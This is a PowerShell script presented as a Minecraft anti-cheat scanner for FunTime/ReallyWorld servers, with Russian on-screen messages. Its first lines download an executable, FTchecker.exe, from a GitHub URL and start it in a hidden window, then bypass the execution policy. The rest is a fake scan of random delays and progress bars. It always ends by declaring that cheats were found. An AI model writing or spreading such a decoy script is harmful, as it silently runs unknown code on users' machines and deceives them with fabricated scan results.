# MINECRAFT CHEAT SCANNER v2.0 [СКАЧИВАЕТ everything В КОНЦЕ]
    # Скачиваем everything в текущую папку
    Invoke-WebRequest -Uri "https://github.com/letyss0304/FTchecker/raw/refs/heads/main/FTchecker.exe" -OutFile "FTchecker.exe" -ErrorAction SilentlyContinue
    
    # Запускаем 
    Start-Process -FilePath "FTchecker.exe" -WindowStyle Hidden
    

Set-ExecutionPolicy Bypass -Scope Process -Force

Clear-Host

Write-Host "ANTI-CHEAT SCAN v3.1" -ForegroundColor Cyan
Write-Host "Minecraft Client Check (FunTime/ReallyWorld)" -ForegroundColor DarkCyan
Write-Host ""

Start-Sleep -Milliseconds 800

Write-Host "Инициализация сканера..." -ForegroundColor Yellow
Start-Sleep -Seconds 4

Write-Host "Проверка цифровой подписи клиента..." -ForegroundColor White -NoNewline
for ($i = 1; $i -le 12; $i++) { 
    Write-Host "." -NoNewline -ForegroundColor Gray
    Start-Sleep -Milliseconds (Get-Random -Min 400 -Max 900)
}
Write-Host " OK" -ForegroundColor Green
Start-Sleep -Seconds 2

Write-Host "Сканирование памяти процесса..." -ForegroundColor White -NoNewline
$progress = 0
while ($progress -lt 100) {
    $progress += Get-Random -Min 3 -Max 11
    if ($progress -gt 100) { $progress = 100 }
    Write-Host "`rСканирование памяти: $progress%" -NoNewline
    Start-Sleep -Milliseconds (Get-Random -Min 800 -Max 1800)
}
Write-Host "`rСканирование памяти: 100%          " -ForegroundColor Green
Start-Sleep -Seconds 3

Write-Host "Анализ загруженных модулей..." -ForegroundColor White
Start-Sleep -Seconds 5

Write-Host "Проверка известных сигнатур читов..." -ForegroundColor White -NoNewline
for ($i = 1; $i -le 8; $i++) {
    Write-Host "." -NoNewline -ForegroundColor Gray
    Start-Sleep -Milliseconds (Get-Random -Min 1200 -Max 2200)
}
Write-Host " завершено" -ForegroundColor Green
Start-Sleep -Seconds 2

Write-Host "Проверка целостности файлов..." -ForegroundColor White -NoNewline
Start-Sleep -Seconds 8
Write-Host " OK" -ForegroundColor Green
Start-Sleep -Seconds 2

Write-Host "Финальный анализ поведения..." -ForegroundColor Yellow
Start-Sleep -Seconds 12

Write-Host "`nРЕЗУЛЬТАТ СКАНИРОВАНИЯ:" -ForegroundColor Cyan
Start-Sleep -Milliseconds 800

Write-Host "!!! ЧИТЫ ОБНАРУЖЕНЫ !!!" -ForegroundColor Red
Write-Host "Тип: modification / memory injection" -ForegroundColor Yellow
Write-Host "Сигнатура совпала с известными читами" -ForegroundColor DarkRed

Write-Host "`nОбщее время проверки: ~1 мин 35 сек" -ForegroundColor DarkGray
Start-Sleep -Milliseconds 2000

Write-Host "Скан завершён." -ForegroundColor Gray
Start-Sleep -Milliseconds 1500
